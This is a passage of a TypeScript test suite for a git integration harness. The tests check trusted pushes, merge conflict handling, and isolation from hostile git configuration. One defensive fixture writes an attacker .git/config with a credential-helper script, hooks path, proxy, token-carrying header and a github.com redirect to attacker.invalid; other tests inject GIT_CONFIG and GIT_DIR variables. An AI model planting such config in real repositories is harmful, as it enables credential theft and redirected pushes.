    const adapters = makeRealAdapters({gitBin})

    try {
      // #when
      await withEnvironment({TEST_GIT_LOG: logPath}, async () => {
        await adapters.pushIntegration(
          {workDir: source.dir, integrationCommit: source.headSha, cleanup: async () => {}},
          source.headSha,
          {repository: targetUrl, ref: targetRef},
          {token: 'test-token'},
        )
      })

      // #then
      expect(runGit(remoteDir, [`rev-parse`, `${targetRef}^{commit}`])).toBe(source.headSha)
      const loggedArgs = (await fs.readFile(logPath, 'utf8'))
        .trim()
        .split('\n')
        .map(line => JSON.parse(line) as string[])
        .find(args => args.includes('push'))
      if (loggedArgs === undefined) throw new Error('expected wrapper to log a push')
      const pushIndex = loggedArgs.indexOf('push')
      expect(loggedArgs.slice(pushIndex)).toEqual([
        'push',
        '--no-verify',
        `--force-with-lease=${targetRef}:${source.firstSha}`,
        targetUrl,
        `${source.headSha}:${targetRef}`,
      ])
    } finally {
      await adapters.dispose?.()
      await fs.rm(source.dir, {recursive: true, force: true})
      await fs.rm(remoteDir, {recursive: true, force: true})
      await fs.rm(path.dirname(gitBin), {recursive: true, force: true})
      await fs.rm(path.dirname(logPath), {recursive: true, force: true})
    }
  })

  it('rejects a ref that moved underneath the run with a named lease error', async () => {
    // #given
    const source = await makeGitSourceRepository()
    const remoteDir = await makeTmpDir()
    const logPath = path.join(await makeTmpDir(), 'git-args.log')
    const targetUrl = 'https://local.test/fro-bot/agent.git'
    const targetRef = 'refs/harness-integrate/test'
    runGit(remoteDir, ['init', '--bare', '--quiet'])
    runGit(source.dir, ['push', '--quiet', remoteDir, `${source.firstSha}:${targetRef}`])
    await fs.writeFile(path.join(source.dir, 'file.txt'), 'moved\n', 'utf8')
    runGit(source.dir, ['commit', '--quiet', '-am', 'moved'])
    const movedSha = runGit(source.dir, ['rev-parse', 'HEAD'])
    runGit(source.dir, ['push', '--quiet', remoteDir, `${movedSha}:refs/hidden/moved`])
    const gitBin = await makeGitUrlWrapper(targetUrl, remoteDir)
    const adapters = makeRealAdapters({gitBin})

    try {
      // #when / #then
      const rejection: unknown = await withEnvironment<unknown>(
        {TEST_GIT_LOG: logPath, TEST_MOVE_REF: targetRef, TEST_MOVE_SHA: movedSha},
        async (): Promise<unknown> => {
          try {
            await adapters.pushIntegration(
              {workDir: source.dir, integrationCommit: source.headSha, cleanup: async () => {}},
              source.headSha,
              {repository: targetUrl, ref: targetRef},
              {token: 'test-token'},
            )
            return undefined
          } catch (error) {
            return error
          }
        },
      )
      expect(rejection).toBeInstanceOf(Error)
      if (!(rejection instanceof Error)) throw new Error('expected trusted push to reject')
      expect(rejection.name).toBe(TRUSTED_PUSH_LEASE_REJECTED_ERROR_NAME)
      expect(rejection.message).toMatch(/moved underneath/)
      expect(runGit(remoteDir, [`rev-parse`, `${targetRef}^{commit}`])).toBe(movedSha)
    } finally {
      await adapters.dispose?.()
      await fs.rm(source.dir, {recursive: true, force: true})
      await fs.rm(remoteDir, {recursive: true, force: true})
      await fs.rm(path.dirname(gitBin), {recursive: true, force: true})
      await fs.rm(path.dirname(logPath), {recursive: true, force: true})
    }
  })

  it('pushes the first release when the target ref does not exist', async () => {
    // #given
    const source = await makeGitSourceRepository()
    const remoteDir = await makeTmpDir()
    const logPath = path.join(await makeTmpDir(), 'git-args.log')
    const targetUrl = 'https://local.test/fro-bot/agent.git'
    const targetRef = 'refs/harness-integrate/first-release'
    runGit(remoteDir, ['init', '--bare', '--quiet'])
    const gitBin = await makeGitUrlWrapper(targetUrl, remoteDir)
    const adapters = makeRealAdapters({gitBin})

    try {
      // #when
      await withEnvironment({TEST_GIT_LOG: logPath}, async () => {
        await adapters.pushIntegration(
          {workDir: source.dir, integrationCommit: source.headSha, cleanup: async () => {}},
          source.headSha,
          {repository: targetUrl, ref: targetRef},
          {token: 'test-token'},
        )
      })

      // #then
      expect(runGit(remoteDir, [`rev-parse`, `${targetRef}^{commit}`])).toBe(source.headSha)
      const loggedArgs = (await fs.readFile(logPath, 'utf8'))
        .trim()
        .split('\n')
        .map(line => JSON.parse(line) as string[])
        .find(args => args.includes('push'))
      if (loggedArgs === undefined) throw new Error('expected wrapper to log a push')
      const pushIndex = loggedArgs.indexOf('push')
      expect(loggedArgs.slice(pushIndex, pushIndex + 3)).toEqual([
        'push',
        '--no-verify',
        `--force-with-lease=${targetRef}:`,
      ])
    } finally {
      await adapters.dispose?.()
      await fs.rm(source.dir, {recursive: true, force: true})
      await fs.rm(remoteDir, {recursive: true, force: true})
      await fs.rm(path.dirname(gitBin), {recursive: true, force: true})
      await fs.rm(path.dirname(logPath), {recursive: true, force: true})
    }
  })
})

// ---------------------------------------------------------------------------
// U5: code-owned deterministic integration driver
// ---------------------------------------------------------------------------

describe('U5 code-owned integration driver', () => {
  it('does not let build-checkout git config reach the trusted credentialed push repository', async () => {
    // #given
    const sourceDir = await makeTmpDir()

    try {
      runGit(sourceDir, ['init', '--quiet'])
      runGit(sourceDir, ['config', 'user.name', 'harness-test'])
      runGit(sourceDir, ['config', 'user.email', 'harness-test@example.invalid'])
      await fs.writeFile(path.join(sourceDir, 'README.md'), 'trusted commit\n', 'utf8')
      runGit(sourceDir, ['add', 'README.md'])
      runGit(sourceDir, ['commit', '--quiet', '-m', 'integration'])
      const integrationCommit = runGit(sourceDir, ['rev-parse', 'HEAD'])
      runGit(sourceDir, ['tag', 'v1.15.13'])
      const manifest: ProvenanceManifest = {
        baseVersion: '1.15.13',
        carryManifest: {base: 'v1.15.13', carries: []},
        integrationRefs: [],
        integrationCommit,
        buildSha: 'dev',
      }
      await writeProvenanceManifest(sourceDir, manifest)
      const helperMarker = path.join(sourceDir, 'credential-helper-invoked')
      const helperPath = path.join(sourceDir, 'malicious-credential-helper.sh')
      await fs.writeFile(helperPath, `#!/bin/sh\nprintf invoked > ${helperMarker}\n`, {encoding: 'utf8', mode: 0o700})
      await fs.writeFile(
        path.join(sourceDir, '.git', 'config'),
        `[core]\n\thooksPath = /tmp/attacker-hooks\n[credential]\n\thelper = !${helperPath}\n[include]\n\tpath = /tmp/attacker-config\n[http]\n\tproxy = http://attacker.invalid\n\textraheader = Authorization: bearer SECRET_TOKEN\n[protocol]\n\tallow = always\n[url "https://attacker.invalid/"]\n\tinsteadOf = https://github.com/\n`,
        'utf8',
      )

      const adapters = makeRealAdapters()
      const trusted = await adapters.prepareTrustedPushRepository(sourceDir, integrationCommit, manifest, {
        baseTag: 'v1.15.13',
        integrationCommit,
        squashed: false,
        workflowsStripped: false,
      })

      try {
        // #then
        expect(trusted.workDir).not.toBe(sourceDir)
        expect(await adapters.getCommitSha(trusted.workDir)).toBe(integrationCommit)
        expect(await readProvenanceManifest(trusted.workDir)).toEqual(manifest)
        const trustedConfig = await fs.readFile(path.join(trusted.workDir, '.git', 'config'), 'utf8')
        expect(trustedConfig).not.toContain('attacker')
        expect(trustedConfig).not.toContain('SECRET_TOKEN')
        expect(trustedConfig).not.toContain('insteadOf')
        await expect(
          adapters.pushIntegration(
            trusted,
            integrationCommit,
            {repository: 'https://127.0.0.1:1/unreachable.git', ref: 'refs/harness-integrate/1.15.13'},
            {token: 'SECRET_TOKEN'},
          ),
        ).rejects.toThrow()
        await expect(fs.stat(helperMarker)).rejects.toThrow()
      } finally {
        await trusted.cleanup()
        await expect(fs.stat(trusted.workDir)).rejects.toThrow()
      }

      await expect(fs.stat(sourceDir)).resolves.toBeTruthy()
    } finally {
      await fs.rm(sourceDir, {recursive: true, force: true})
    }
  })

  it('keeps the public integration API local-only until the command owns artifact completion', async () => {
    // #given
    const dir = await makeTmpDir()
    let credentialsRequested = false
    let pushCalled = false
    const adapters = makeAdapters({
      acquirePushCredential: async () => {
        credentialsRequested = true
        return {token: 'test-token'}
      },
      pushIntegration: async () => {
        pushCalled = true
      },
    })

    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [],
          workDir: dir,
          dryRun: false,
          pushTarget: {repository: 'https://github.com/fro-bot/agent.git', ref: 'refs/harness-integrate/1.15.13'},
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(true)
      expect(credentialsRequested).toBe(false)
      expect(pushCalled).toBe(false)
      expect('finalizeIntegration' in integrateModule).toBe(false)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('rejects HEAD drift caused by the build hook before acquiring push credentials', async () => {
    // #given
    const dir = await makeTmpDir()
    let head = 'frozen-integration-commit'
    let credentialsRequested = false
    const adapters = makeAdapters({
      getCommitSha: async () => head,
      buildCli: async () => {
        head = 'build-moved-head'
      },
      acquirePushCredential: async () => {
        credentialsRequested = true
        return {token: 'test-token'}
      },
    })

    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [],
          workDir: dir,
          dryRun: false,
          pushTarget: {repository: 'https://github.com/fro-bot/agent.git', ref: 'refs/harness-integrate/1.15.13'},
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(false)
      expect(credentialsRequested).toBe(false)
      if (result.ok) throw new Error('expected build-time HEAD drift to fail')
      expect(result.stage).toBe('tree')
      expect(result.error).toMatch(/drift|frozen|HEAD/i)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('merges refs in configured order without invoking the legacy model merge', async () => {
    // #given
    const dir = await makeTmpDir()
    const promptPath = path.join(dir, 'legacy-prompt.txt')
    await fs.writeFile(promptPath, 'legacy prompt', 'utf8')
    const events: string[] = []
    const adapters = {
      ...makeAdapters({
        runMerge: async () => {
          throw new Error('legacy model merge must not run for a clean merge')
        },
        fetchRef: async (_workDir: string, _remoteUrl: string, fetchRef: string) => {
          events.push(`fetch:${fetchRef}`)
        },
        buildCli: async () => {
          events.push('build')
        },
        verifyVersion: async () => {
          events.push('verify')
        },
      }),
      mergeRef: async (_workDir: string, mergeRef: string) => {
        events.push(`merge:${mergeRef}`)
        return {kind: 'clean'} as const
      },
      resetToBase: async () => {
        events.push('reset-to-base')
      },
      stripWorkflowFiles: async () => {
        events.push('strip-workflows')
      },
      validateFinalTree: async () => {
        events.push('validate-tree')
      },
      acquirePushCredential: async () => {
        throw new Error('dry-run must not acquire push credentials')
      },
      pushIntegration: async () => {
        throw new Error('dry-run must not push')
      },
    }

    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [
            'https://github.com/anomalyco/opencode/pull/1',
            'https://github.com/anomalyco/opencode/pull/2',
          ],
          agent: 'build',
          model: 'anthropic/claude-sonnet-5',
          opencodeBin: 'opencode',
          workDir: dir,
          promptPath,
          dryRun: true,
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(true)
      expect(events.slice(0, 4)).toEqual([
        'fetch:refs/pull/1/head',
        'merge:refs/remotes/watch/anomalyco-opencode/pr-1',
        'fetch:refs/pull/2/head',
        'merge:refs/remotes/watch/anomalyco-opencode/pr-2',
      ])
      expect(events).not.toContain('legacy-model-merge')
      expect(events.indexOf('strip-workflows')).toBeLessThan(events.indexOf('validate-tree'))
      expect(events).toContain('build')
      expect(events).toContain('verify')
      if (!result.ok) throw new Error('expected successful dry-run')
      expect(result.dryRun).toBe(true)
      expect(result.pushed).toBe(false)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('returns a typed conflict boundary without attempting to publish', async () => {
    // #given
    const dir = await makeTmpDir()
    const promptPath = path.join(dir, 'legacy-prompt.txt')
    await fs.writeFile(promptPath, 'legacy prompt', 'utf8')
    let credentialsRequested = false
    let pushCalled = false
    const adapters = {
      ...makeAdapters({
        runMerge: async () => {
          throw new Error('legacy model merge must not run')
        },
      }),
      mergeRef: async () =>
        ({
          kind: 'conflict',
          conflictPaths: ['packages/opencode/src/session/prompt.ts'],
        }) as const,
      acquirePushCredential: async () => {
        credentialsRequested = true
        return {token: 'test-token'}
      },
      pushIntegration: async () => {
        pushCalled = true
      },
    }

    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          workDir: dir,
          promptPath,
          dryRun: false,
          pushTarget: {repository: 'https://github.com/fro-bot/agent.git', ref: 'refs/harness-integrate/1.15.13'},
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(false)
      if (result.ok) throw new Error('expected conflict result')
      if (result.kind !== 'conflict') throw new Error('expected typed conflict result')
      expect(result.conflict.conflictPaths).toEqual(['packages/opencode/src/session/prompt.ts'])
      expect(credentialsRequested).toBe(false)
      expect(pushCalled).toBe(false)
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('invokes the conflict resolver only for a conflict and explicitly stages its validated paths', async () => {
    // #given
    const dir = await makeTmpDir()
    const events: string[] = []
    const resolverResult: ConflictResolverResult = {
      ok: true,
      attempts: 1,
      resolvedPaths: ['packages/opencode/src/session/prompt.ts'],
      resolvedDigests: {'packages/opencode/src/session/prompt.ts': 'accepted-digest'},
      diagnostics: [],
    }
    const adapters = makeAdapters({
      mergeRef: async () => ({kind: 'conflict', conflictPaths: ['packages/opencode/src/session/prompt.ts']}),
      resolveConflict: async request => {
        expect(request.brokerAuthJson).toBe('broker-json')
        expect(request.runnerTempDir).toBe('/runner-temp')
        events.push('resolve-conflict')
        return resolverResult
      },
      stagePaths: async (_workDir, paths) => {
        events.push(`stage:${paths.join(',')}`)
      },
      verifyStagedPaths: async (_workDir, digests) => {
        expect(digests).toEqual({'packages/opencode/src/session/prompt.ts': 'accepted-digest'})
        events.push('verify-staged')
      },
      assertNoUnmerged: async () => {
        events.push('assert-no-unmerged')
      },
      completeMerge: async () => {
        events.push('complete-merge')
      },
    })

    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: ['https://github.com/anomalyco/opencode/pull/30182'],
          workDir: dir,
          dryRun: true,
          brokerAuthJson: 'broker-json',
          runnerTempDir: '/runner-temp',
        },
        adapters,
      )

      // #then
      expect(result.ok).toBe(true)
      expect(events).toEqual([
        'resolve-conflict',
        'stage:packages/opencode/src/session/prompt.ts',
        'verify-staged',
        'assert-no-unmerged',
        'complete-merge',
      ])
    } finally {
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('real adapters explicitly stage the repaired path and complete a real merge with no unmerged entries', async () => {
    // #given
    const dir = await makeTmpDir()
    const adapters = makeRealAdapters()
    try {
      runGit(dir, ['init', '--quiet'])
      runGit(dir, ['config', 'user.name', 'harness-test'])
      runGit(dir, ['config', 'user.email', 'harness-test@example.invalid'])
      await fs.writeFile(path.join(dir, 'conflict.txt'), 'base\n', 'utf8')
      runGit(dir, ['add', 'conflict.txt'])
      runGit(dir, ['commit', '--quiet', '-m', 'base'])
      runGit(dir, ['checkout', '--quiet', '-b', 'source'])
      await fs.writeFile(path.join(dir, 'conflict.txt'), 'source\n', 'utf8')
      runGit(dir, ['commit', '--quiet', '-am', 'source'])
      runGit(dir, ['checkout', '--quiet', '-b', 'integration', 'HEAD~1'])
      await fs.writeFile(path.join(dir, 'conflict.txt'), 'integration\n', 'utf8')
      runGit(dir, ['commit', '--quiet', '-am', 'integration'])
      try {
        runGit(dir, ['merge', '--no-ff', '--no-edit', 'refs/heads/source'])
      } catch {
        // Expected conflict.
      }
      await fs.writeFile(path.join(dir, 'conflict.txt'), 'resolved\n', 'utf8')
      // #when
      await adapters.stagePaths?.(dir, ['conflict.txt'])
      if (adapters.verifyStagedPaths === undefined) throw new Error('real adapters must verify staged bytes')
      await adapters.verifyStagedPaths(dir, {
        'conflict.txt': crypto.createHash('sha256').update('resolved\n').digest('hex'),
      })
      await adapters.assertNoUnmerged?.(dir)
      await adapters.completeMerge?.(dir)

      // #then
      expect(runGit(dir, ['ls-files', '-u'])).toBe('')
      expect(await fs.readFile(path.join(dir, 'conflict.txt'), 'utf8')).toBe('resolved\n')
    } finally {
      await adapters?.dispose?.()
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('real adapters surface a conflict when the merge base lies beyond a shallow clone boundary', async () => {
    // #given
    const repositoryDir = await makeTmpDir()
    const workDir = path.join(await makeTmpDir(), 'worktree')
    const adapters = makeRealAdapters()
    try {
      runGit(repositoryDir, ['init', '--quiet'])
      runGit(repositoryDir, ['config', 'user.name', 'harness-test'])
      runGit(repositoryDir, ['config', 'user.email', 'harness-test@example.invalid'])
      await fs.writeFile(path.join(repositoryDir, 'conflict.txt'), 'root\n', 'utf8')
      runGit(repositoryDir, ['add', 'conflict.txt'])
      runGit(repositoryDir, ['commit', '--quiet', '-m', 'root'])
      const mergeBase = runGit(repositoryDir, ['rev-parse', 'HEAD'])

      await fs.writeFile(path.join(repositoryDir, 'conflict.txt'), 'integration\n', 'utf8')
      runGit(repositoryDir, ['add', 'conflict.txt'])
      runGit(repositoryDir, ['commit', '--quiet', '-m', 'release'])
      runGit(repositoryDir, ['tag', 'v1.15.13'])

      runGit(repositoryDir, ['checkout', '--quiet', '-b', 'source', mergeBase])
      await fs.writeFile(path.join(repositoryDir, 'conflict.txt'), 'source\n', 'utf8')
      runGit(repositoryDir, ['commit', '--quiet', '-am', 'source'])

      const repositoryUrl = `file://${repositoryDir}`
      const sourceRef = 'refs/remotes/watch/local/source'
      await adapters.cloneRepo(repositoryUrl, workDir, 'v1.15.13')

      // #when
      await adapters.fetchRef(workDir, repositoryUrl, 'refs/heads/source', sourceRef)
      const actualMergeBase = runGit(workDir, ['merge-base', 'HEAD', sourceRef])
      const outcome = await adapters.mergeRef(workDir, sourceRef)

      // #then
      expect(runGit(workDir, ['rev-parse', '--is-shallow-repository'])).toBe('false')
      expect(actualMergeBase).toBe(mergeBase)
      expect(outcome.kind).toBe('conflict')
      if (outcome.kind !== 'conflict') throw new Error('expected real adapter to return a typed conflict')
      expect(outcome.conflictPaths).toEqual(['conflict.txt'])
    } finally {
      await adapters.dispose?.()
      await fs.rm(repositoryDir, {recursive: true, force: true})
      await fs.rm(path.dirname(workDir), {recursive: true, force: true})
    }
  })

  it('rejects clean-filter transformed staged bytes despite ambient GIT_CONFIG injection', async () => {
    // #given
    const dir = await makeTmpDir()
    const originalConfig = {
      count: process.env.GIT_CONFIG_COUNT,
      key: process.env.GIT_CONFIG_KEY_0,
      value: process.env.GIT_CONFIG_VALUE_0,
    }
    const adapters = makeRealAdapters()
    try {
      runGit(dir, ['init', '--quiet'])
      runGit(dir, ['config', 'user.name', 'harness-test'])
      runGit(dir, ['config', 'user.email', 'harness-test@example.invalid'])
      runGit(dir, ['config', 'filter.uppercase.clean', 'tr a-z A-Z'])
      runGit(dir, ['config', 'filter.uppercase.smudge', 'cat'])
      runGit(dir, ['config', 'filter.uppercase.required', 'true'])
      await fs.writeFile(path.join(dir, '.gitattributes'), 'conflict.txt filter=uppercase\n', 'utf8')
      await fs.writeFile(path.join(dir, 'conflict.txt'), 'base\n', 'utf8')
      runGit(dir, ['add', '.gitattributes', 'conflict.txt'])
      runGit(dir, ['commit', '--quiet', '-m', 'base'])
      runGit(dir, ['checkout', '--quiet', '-b', 'source'])
      await fs.writeFile(path.join(dir, 'conflict.txt'), 'source\n', 'utf8')
      runGit(dir, ['commit', '--quiet', '-am', 'source'])
      runGit(dir, ['checkout', '--quiet', '-b', 'integration', 'HEAD~1'])
      await fs.writeFile(path.join(dir, 'conflict.txt'), 'integration\n', 'utf8')
      runGit(dir, ['commit', '--quiet', '-am', 'integration'])
      try {
        runGit(dir, ['merge', '--no-ff', '--no-edit', 'refs/heads/source'])
      } catch {
        // Expected conflict.
      }
      await fs.writeFile(path.join(dir, 'conflict.txt'), 'resolved\n', 'utf8')
      process.env.GIT_CONFIG_COUNT = '1'
      process.env.GIT_CONFIG_KEY_0 = 'filter.uppercase.clean'
      process.env.GIT_CONFIG_VALUE_0 = 'cat'
      // #when
      await adapters.stagePaths?.(dir, ['conflict.txt'])
      if (adapters.verifyStagedPaths === undefined) throw new Error('real adapters must verify staged bytes')
      const expectedDigest = crypto.createHash('sha256').update('resolved\n').digest('hex')
      const verification = adapters.verifyStagedPaths(dir, {'conflict.txt': expectedDigest})

      // #then
      await expect(verification).rejects.toThrow(/staged.*mismatch|bytes/i)
      expect(runGit(dir, ['show', ':conflict.txt'])).toBe('RESOLVED')
    } finally {
      await adapters?.dispose?.()
      setEnvironmentValue('GIT_CONFIG_COUNT', originalConfig.count)
      setEnvironmentValue('GIT_CONFIG_KEY_0', originalConfig.key)
      setEnvironmentValue('GIT_CONFIG_VALUE_0', originalConfig.value)
      await fs.rm(dir, {recursive: true, force: true})
    }
  })

  it('ignores ambient Git repository, index, object, work-tree, and config control variables', async () => {
    // #given
    const dir = await makeTmpDir()
    const alternateRoot = await makeTmpDir()
    const adapters = makeRealAdapters()
    try {
      runGit(dir, ['init', '--quiet'])
      runGit(dir, ['config', 'user.name', 'harness-test'])
      runGit(dir, ['config', 'user.email', 'harness-test@example.invalid'])
      await fs.writeFile(path.join(dir, 'conflict.txt'), 'base\n', 'utf8')
      runGit(dir, ['add', 'conflict.txt'])
      runGit(dir, ['commit', '--quiet', '-m', 'base'])
      runGit(dir, ['checkout', '--quiet', '-b', 'source'])
      await fs.writeFile(path.join(dir, 'conflict.txt'), 'source\n', 'utf8')
      runGit(dir, ['commit', '--quiet', '-am', 'source'])
      runGit(dir, ['checkout', '--quiet', '-b', 'integration', 'HEAD~1'])
      await fs.writeFile(path.join(dir, 'conflict.txt'), 'integration\n', 'utf8')
      runGit(dir, ['commit', '--quiet', '-am', 'integration'])
      try {
        runGit(dir, ['merge', '--no-ff', '--no-edit', 'refs/heads/source'])
      } catch {
        // Expected conflict.
      }
      await fs.writeFile(path.join(dir, 'conflict.txt'), 'resolved\n', 'utf8')
      const alternateWorkTree = path.join(alternateRoot, 'worktree')
      const alternateGitDir = path.join(alternateRoot, 'git')
      const alternateIndex = path.join(alternateRoot, 'index')
      const alternateObjects = path.join(alternateRoot, 'objects')
      const alternateCommonDir = path.join(alternateRoot, 'common')
      const alternateTemplateDir = path.join(alternateRoot, 'template')
      // #when
      await withEnvironment(
        {
          GIT_DIR: alternateGitDir,
          GIT_INDEX_FILE: alternateIndex,
          GIT_WORK_TREE: alternateWorkTree,
          GIT_OBJECT_DIRECTORY: alternateObjects,
          GIT_ALTERNATE_OBJECT_DIRECTORIES: alternateObjects,
          GIT_COMMON_DIR: alternateCommonDir,
          GIT_REPLACE_REF_BASE: 'refs/replacements/ambient',
          GIT_TEMPLATE_DIR: alternateTemplateDir,
          GIT_CONFIG_COUNT: '1',
          GIT_CONFIG_KEY_0: 'core.hooksPath',
          GIT_CONFIG_VALUE_0: alternateTemplateDir,
          GIT_ASKPASS: path.join(alternateRoot, 'askpass'),
          SSH_ASKPASS: path.join(alternateRoot, 'ssh-askpass'),
          GIT_TRACE: path.join(alternateRoot, 'trace'),
          HTTPS_PROXY: 'http://127.0.0.1:9',
        },
        async () => {
          await adapters.stagePaths?.(dir, ['conflict.txt'])
          if (adapters.verifyStagedPaths === undefined) throw new Error('real adapters must verify staged bytes')
          await adapters.verifyStagedPaths(dir, {
            'conflict.txt': crypto.createHash('sha256').update('resolved\n').digest('hex'),
          })
          await adapters.assertNoUnmerged(dir)
          await adapters.completeMerge?.(dir)
        },
      )

      // #then
      expect(runGit(dir, ['show', 'HEAD:conflict.txt'])).toBe('resolved')
      expect(runGit(dir, ['ls-files', '-u'])).toBe('')
      await expect(fs.access(alternateIndex)).rejects.toThrow()
    } finally {
      await adapters?.dispose?.()
      await fs.rm(dir, {recursive: true, force: true})
      await fs.rm(alternateRoot, {recursive: true, force: true})
    }
  })

  it('ignores inherited Git templates and disables hooks for clone and commit', async () => {
    // #given
    const sourceDir = await makeTmpDir()
    const destinationDir = await makeTmpDir()
    const templateDir = await makeTmpDir()
    const hooksRoot = await makeTmpDir()
    const sentinel = path.join(templateDir, 'sentinel')
    const hook = path.join(templateDir, 'hooks', 'post-commit')
    const adapters = makeRealAdapters({hooksRoot})
    try {
      runGit(sourceDir, ['init', '--quiet'])
      runGit(sourceDir, ['config', 'user.name', 'harness-test'])
      runGit(sourceDir, ['config', 'user.email', 'harness-test@example.invalid'])
      await fs.writeFile(path.join(sourceDir, 'file.txt'), 'source\n', 'utf8')
      runGit(sourceDir, ['add', 'file.txt'])
      runGit(sourceDir, ['commit', '--quiet', '-m', 'source'])
      await fs.mkdir(path.dirname(hook), {recursive: true})
      await fs.writeFile(hook, `#!/bin/sh\nprintf sentinel > ${sentinel}\n`, {encoding: 'utf8', mode: 0o700})
      await fs.chmod(hook, 0o700)
      // #when
      await withEnvironment({GIT_TEMPLATE_DIR: templateDir}, async () => {
        await adapters.cloneRepo(sourceDir, destinationDir)
        await expect(fs.access(path.join(destinationDir, '.git', 'hooks', 'post-commit'))).rejects.toThrow()
        const destinationHook = path.join(destinationDir, '.git', 'hooks', 'post-commit')
        await fs.writeFile(destinationHook, `#!/bin/sh\nprintf sentinel > ${sentinel}\n`, {
          encoding: 'utf8',
          mode: 0o700,
        })
        await fs.chmod(destinationHook, 0o700)
        await adapters.commitIntegration?.(destinationDir, 'integration')
      })

      // #then
      await expect(fs.access(sentinel)).rejects.toThrow()
      await adapters.dispose?.()
      expect(await fs.readdir(hooksRoot)).toEqual([])
    } finally {
      await adapters?.dispose?.()
      await fs.rm(sourceDir, {recursive: true, force: true})
      await fs.rm(destinationDir, {recursive: true, force: true})
      await fs.rm(templateDir, {recursive: true, force: true})
      await fs.rm(hooksRoot, {recursive: true, force: true})
    }
  })

  it('cleans the disabled-hooks directory after successful and failed adapter lifecycles', async () => {
    // #given
    const sourceDir = await makeTmpDir()
    const destinationDir = await makeTmpDir()
    const successHooksRoot = await makeTmpDir()
    const failureHooksRoot = await makeTmpDir()
    let successfulAdapters: IntegrationAdapters | undefined
    let failedAdapters: IntegrationAdapters | undefined
    try {
      runGit(sourceDir, ['init', '--quiet'])
      runGit(sourceDir, ['config', 'user.name', 'harness-test'])
      runGit(sourceDir, ['config', 'user.email', 'harness-test@example.invalid'])
      await fs.writeFile(path.join(sourceDir, 'file.txt'), 'source\n', 'utf8')
      runGit(sourceDir, ['add', 'file.txt'])
      runGit(sourceDir, ['commit', '--quiet', '-m', 'source'])

      // #when
      successfulAdapters = makeRealAdapters({hooksRoot: successHooksRoot})
      await successfulAdapters.cloneRepo(sourceDir, destinationDir)
      expect((await fs.readdir(successHooksRoot)).length).toBe(1)
      await successfulAdapters.dispose?.()
      await successfulAdapters.dispose?.()

      failedAdapters = makeRealAdapters({hooksRoot: failureHooksRoot})
      await expect(failedAdapters.cloneRepo(path.join(sourceDir, 'missing'), destinationDir)).rejects.toThrow()
      expect((await fs.readdir(failureHooksRoot)).length).toBe(1)
      await failedAdapters.dispose?.()
      await failedAdapters.dispose?.()

      // #then
      expect(await fs.readdir(successHooksRoot)).toEqual([])
      expect(await fs.readdir(failureHooksRoot)).toEqual([])
    } finally {
      await successfulAdapters?.dispose?.()
      await failedAdapters?.dispose?.()
      await fs.rm(sourceDir, {recursive: true, force: true})
      await fs.rm(destinationDir, {recursive: true, force: true})
      await fs.rm(successHooksRoot, {recursive: true, force: true})
      await fs.rm(failureHooksRoot, {recursive: true, force: true})
    }
  })

  it('disposes the integration-owned Git lifecycle after success and failure', async () => {
    // #given
    const successEvents: string[] = []
    const failureEvents: string[] = []
    const successWorkDir = await makeTmpDir()
    const failureWorkDir = await makeTmpDir()
    const config = {
      baseVersion: '1.15.13',
      releaseRepo: 'anomalyco/opencode',
      integrationRefs: [],
      workDir: successWorkDir,
      dryRun: true,
    }

    try {
      // #when
      const success = await runIntegration(
        config,
        makeAdapters({
          dispose: async () => {
            successEvents.push('dispose')
          },
        }),
      )
      const failure = await runIntegration(
        {...config, workDir: failureWorkDir},
        makeAdapters({
          cloneRepo: async () => {
            throw new Error('clone failed')
          },
          dispose: async () => {
            failureEvents.push('dispose')
          },
        }),
      )

      // #then
      expect(success.ok).toBe(true)
      expect(failure.ok).toBe(false)
      expect(successEvents).toEqual(['dispose'])
      expect(failureEvents).toEqual(['dispose'])
    } finally {
      await fs.rm(successWorkDir, {recursive: true, force: true})
      await fs.rm(failureWorkDir, {recursive: true, force: true})
    }
  })

  it('returns a typed cleanup failure when a successful pipeline cannot dispose', async () => {
    // #given
    const workDir = await makeTmpDir()
    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [],
          workDir,
          dryRun: true,
        },
        makeAdapters({
          dispose: async () => {
            throw new Error('cleanup failed')
          },
        }),
      )

      // #then
      expect(result.ok).toBe(false)
      if (result.ok) throw new Error('expected cleanup failure')
      expect(result.stage).toBe('cleanup')
      expect(result.error).toContain('cleanup failed')
    } finally {
      await fs.rm(workDir, {recursive: true, force: true})
    }
  })

  it('preserves the typed pipeline failure when disposal also fails', async () => {
    // #given
    const workDir = await makeTmpDir()
    try {
      // #when
      const result = await runIntegration(
        {
          baseVersion: '1.15.13',
          releaseRepo: 'anomalyco/opencode',
          integrationRefs: [],
          workDir,
          dryRun: true,
        },
        makeAdapters({
          cloneRepo: async () => {
            throw new Error('pipeline failed')
          },
          dispose: async () => {
            throw new Error('cleanup failed')
          },
        }),
      )

      // #then
      expect(result.ok).toBe(false)
      if (result.ok) throw new Error('expected pipeline failure')
      expect(result.stage).toBe('clone')
      expect(result.error).toContain('pipeline failed')
      expect(result.error).not.toContain('cleanup failed')
    } finally {
      await fs.rm(workDir, {recursive: true, force: true})
    }
  })

  it('preserves an unexpected pipeline exception when disposal also fails', async () => {
    // #given
    const workDir = await makeTmpDir()
    let disposed = false
    const unexpectedConfig = {
      get baseVersion(): string {
